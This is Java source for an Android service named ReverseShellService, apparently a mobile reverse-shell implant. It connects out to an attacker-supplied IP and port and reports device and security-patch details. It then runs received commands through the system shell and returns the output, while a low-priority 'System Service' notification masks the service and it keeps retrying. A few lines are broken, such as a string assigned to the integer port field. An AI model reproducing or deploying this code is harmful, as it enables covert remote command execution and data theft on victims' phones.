package com.example.reverse_shell;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Background Service for Reverse Shell Connection - MAXIMUM ACCESS VERSION
 */
public class ReverseShellService extends Service {

    private static final String TAG = "RevShellService";
    private static final String CHANNEL_ID = "ReverseShellChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final String LOG_FILE = "revshell_log.txt";

    private String attackerIP = "Attacker IP Address";
    private int attackerPort = "Replace Port Number";
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private volatile boolean isRunning = false;
    private Thread connectionThread;
    private String currentDirectory = "/sdcard";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");

        // Set initial working directory to most accessible location
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            currentDirectory = Environment.getExternalStorageDirectory().getAbsolutePath();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            attackerIP = intent.getStringExtra("ATTACKER_IP");
            attackerPort = intent.getIntExtra("ATTACKER_PORT", 4444);
        }

        Log.d(TAG, "Service starting with IP: " + attackerIP + " Port: " + attackerPort);

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification("Connecting..."));

        isRunning = true;
        connectionThread = new Thread(new Runnable() {
            @Override
            public void run() {
                connectToAttacker();
            }
        });
        connectionThread.start();

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System service");

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification(String status) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        );

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText(status)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    private void updateNotification(String status) {
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.notify(NOTIFICATION_ID, createNotification(status));
        }
    }

    private void connectToAttacker() {
        int retryCount = 0;
        int maxRetries = 10; // Increased retries
        int retryDelay = 3000; // 3 seconds initial

        while (isRunning && retryCount < maxRetries) {
            try {
                Log.d(TAG, "Attempting connection " + (retryCount + 1) + "/" + maxRetries);
                updateNotification("Active (" + (retryCount + 1) + ")");

                socket = new Socket(attackerIP, attackerPort);
                socket.setKeepAlive(true);
                socket.setTcpNoDelay(true);

                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                Log.d(TAG, "Connection established!");
                updateNotification("Connected");
                logConnection("Connection established to " + attackerIP + ":" + attackerPort);

                sendBanner();
                commandLoop();

                break;

            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
                logConnection("Connection failed: " + e.getMessage());

                retryCount++;
                if (retryCount < maxRetries && isRunning) {
                    try {
                        Thread.sleep(retryDelay);
                        retryDelay = Math.min(retryDelay * 2, 30000); // Max 30s
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            } finally {
                closeConnection();
            }
        }

        if (retryCount >= maxRetries) {
            Log.e(TAG, "Max retries reached");
            updateNotification("Disconnected");
            stopSelf();
        }
    }

    private void sendBanner() {
        try {
            out.println("\n╔═══════════════════════════════════════════════╗");
            out.println("║   Android Shell Connected - MAXIMUM ACCESS    ║");
            out.println("╚═══════════════════════════════════════════════╝");
            out.println("[*] Device: " + Build.MANUFACTURER + " " + Build.MODEL);
            out.println("[*] Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
            out.println("[*] Brand: " + Build.BRAND);
            out.println("[*] Security Patch: " + Build.VERSION.SECURITY_PATCH);
            out.println("[*] Working Directory: " + currentDirectory);
            out.println("[*] Storage State: " + Environment.getExternalStorageState());

            // Check storage permission status
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                boolean hasStorageAccess = Environment.isExternalStorageManager();
                out.println("[*] All Files Access: " + (hasStorageAccess ? "GRANTED ✓" : "DENIED ✗"));
            }

            out.println("\n[*] Type 'help' for commands");
            out.println("[*] Type 'exit' to disconnect\n");
            out.flush();
        } catch (Exception e) {
            Log.e(TAG, "Error sending banner: " + e.getMessage());
        }
    }

    private void commandLoop() {
        try {
            String command;
            out.print(currentDirectory + " $ ");
            out.flush();

            while (isRunning && (command = in.readLine()) != null) {
                command = command.trim();

                if (command.isEmpty()) {
                    out.print(currentDirectory + " $ ");
                    out.flush();
                    continue;
                }

                logCommand(command);

                if (command.equalsIgnoreCase("exit") || command.equalsIgnoreCase("quit")) {
                    out.println("[*] Closing connection...");
                    out.flush();
                    break;
                } else if (command.equalsIgnoreCase("help")) {
                    showHelp();
                } else if (command.startsWith("info")) {
                    showDeviceInfo();
                } else if (command.startsWith("cd ")) {
                    changeDirectory(command.substring(3).trim());
                } else if (command.equalsIgnoreCase("pwd")) {
                    out.println(currentDirectory + "\n");
                } else if (command.equalsIgnoreCase("access")) {
                    showAccessiblePaths();
                } else {
                    String result = executeCommand(command);
                    out.print(result);
                    out.flush();
                }

                out.print(currentDirectory + " $ ");
                out.flush();
            }
        } catch (Exception e) {
            Log.e(TAG, "Command loop error: " + e.getMessage());
            logConnection("Command loop error: " + e.getMessage());
        }
    }

    private void showHelp() {
        out.println("\n╔═══════════════════════════════════════════════╗");
        out.println("║              Available Commands                ║");
        out.println("╚═══════════════════════════════════════════════╝");
        out.println("  help          - Show this menu");
        out.println("  info          - Device information");
        out.println("  access        - Show accessible paths");
        out.println("  exit/quit     - Close connection");
        out.println("  pwd           - Print working directory");
        out.println("  cd <path>     - Change directory");
        out.println("  ls [path]     - List directory");
        out.println("  cat <file>    - Display file content");
        out.println("  whoami        - Current user");
        out.println("  id            - User ID info");
        out.println("  getprop       - System properties");
        out.println("  ps            - Process list (limited)");
        out.println("  pm list       - Installed packages");
        out.println("\n[!] Commands run with app permissions only");
        out.println("[!] System paths require root access\n");
    }

    private void showDeviceInfo() {
        out.println("\n╔═══════════════════════════════════════════════╗");
        out.println("║           Device Information                   ║");
        out.println("╚═══════════════════════════════════════════════╝");
        out.println("  Manufacturer:  " + Build.MANUFACTURER);
        out.println("  Model:         " + Build.MODEL);
        out.println("  Brand:         " + Build.BRAND);
        out.println("  Product:       " + Build.PRODUCT);
        out.println("  Device:        " + Build.DEVICE);
        out.println("  Board:         " + Build.BOARD);
        out.println("  Hardware:      " + Build.HARDWARE);
        out.println("  Android:       " + Build.VERSION.RELEASE);
        out.println("  SDK:           " + Build.VERSION.SDK_INT);
        out.println("  Security:      " + Build.VERSION.SECURITY_PATCH);
        out.println("  ABI:           " + Build.SUPPORTED_ABIS[0]);
        out.println("  Fingerprint:   " + Build.FINGERPRINT);
        out.println("\n");
    }

    private void showAccessiblePaths() {
        out.println("\n╔═══════════════════════════════════════════════╗");
        out.println("║           Accessible Paths                     ║");
        out.println("╚═══════════════════════════════════════════════╝");

        // External storage
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            String extStorage = Environment.getExternalStorageDirectory().getAbsolutePath();
            out.println("\n✓ External Storage:");
            out.println("  " + extStorage);
            out.println("  " + extStorage + "/Download");
            out.println("  " + extStorage + "/DCIM");
            out.println("  " + extStorage + "/Documents");
            out.println("  " + extStorage + "/Pictures");
            out.println("  " + extStorage + "/Music");
            out.println("  " + extStorage + "/Movies");
        }

        // App directories
        out.println("\n✓ App Private Directory:");
        out.println("  " + getFilesDir().getAbsolutePath());
        out.println("  " + getCacheDir().getAbsolutePath());

        // Common accessible paths
        out.println("\n✓ System Paths (read-only):");
        out.println("  /system/bin");
        out.println("  /system/etc");
        out.println("  /proc (partial)");

        out.println("\n✗ Restricted Paths (need root):");
        out.println("  /data/data/<other_apps>");
        out.println("  /system/app");
        out.println("  /data/system");
        out.println("\n");
    }

    private void changeDirectory(String path) {
        if (path.isEmpty()) {
            path = "/sdcard";
        }

        // Expand ~ to /sdcard
        if (path.startsWith("~")) {
            path = path.replace("~", "/sdcard");
        }

        // Handle relative paths
        if (!path.startsWith("/")) {
            path = currentDirectory + "/" + path;
        }

        File dir = new File(path);
        if (dir.exists() && dir.isDirectory()) {
            try {
                currentDirectory = dir.getCanonicalPath();
                out.println("[*] Changed to: " + currentDirectory + "\n");
            } catch (Exception e) {
                out.println("[!] Error: " + e.getMessage() + "\n");
            }
        } else {
            out.println("[!] Directory not found or not accessible: " + path + "\n");
        }
    }

    /**
     * Enhanced command execution with better error handling
     */
    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();

        try {
            // Build command with proper working directory
            String[] cmd = {
                    "/system/bin/sh",
                    "-c",
                    "cd \"" + currentDirectory + "\" 2>/dev/null && " + command + " 2>&1"
            };

            Process process = Runtime.getRuntime().exec(cmd);

            // Read output with timeout
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            boolean hasOutput = false;
            int lineCount = 0;
            int maxLines = 1000; // Prevent overwhelming output

            while ((line = reader.readLine()) != null && lineCount < maxLines) {
                output.append(line).append("\n");
                hasOutput = true;
                lineCount++;
            }

            if (lineCount >= maxLines) {
                output.append("\n[!] Output truncated (max ").append(maxLines).append(" lines)\n");
            }

            // Wait for process with timeout
            boolean finished = process.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);

            if (!finished) {
                process.destroy();
                output.append("\n[!] Command timeout (>10s)\n");
            } else {
                int exitCode = process.exitValue();

                if (!hasOutput) {
                    if (exitCode == 0) {
                        output.append("[*] Command executed successfully\n");
                    } else {
                        output.append("[!] Command failed (exit code ").append(exitCode).append(")\n");
                        output.append("[!] Tip: Check permissions or try: access\n");
                    }
                }
            }

            reader.close();

        } catch (Exception e) {
            output.append("[!] Error: ").append(e.getMessage()).append("\n");
            Log.e(TAG, "Command execution error: " + e.getMessage());
        }

        return output.toString();
    }

    private void logCommand(String command) {
        try {
            File logFile = new File(getFilesDir(), LOG_FILE);
            FileWriter fw = new FileWriter(logFile, true);
            PrintWriter pw = new PrintWriter(fw);

            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                    Locale.getDefault()).format(new Date());

            pw.println("[" + timestamp + "] CMD: " + command);
            pw.close();

        } catch (Exception e) {
            Log.e(TAG, "Logging error: " + e.getMessage());
        }
    }

    private void logConnection(String message) {
        try {
            File logFile = new File(getFilesDir(), LOG_FILE);
            FileWriter fw = new FileWriter(logFile, true);
            PrintWriter pw = new PrintWriter(fw);

            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                    Locale.getDefault()).format(new Date());

            pw.println("[" + timestamp + "] CONNECTION: " + message);
            pw.close();

        } catch (Exception e) {
            Log.e(TAG, "Connection logging error: " + e.getMessage());
        }
    }

    private void closeConnection() {
        try {
            if (out != null) out.close();
            if (in != null) in.close();
            if (socket != null && !socket.isClosed()) socket.close();
            Log.d(TAG, "Connection closed");
        } catch (Exception e) {
            Log.e(TAG, "Error closing connection: " + e.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        closeConnection();

        if (connectionThread != null) {
            connectionThread.interrupt();
        }

        Log.d(TAG, "Service destroyed");
    }
}
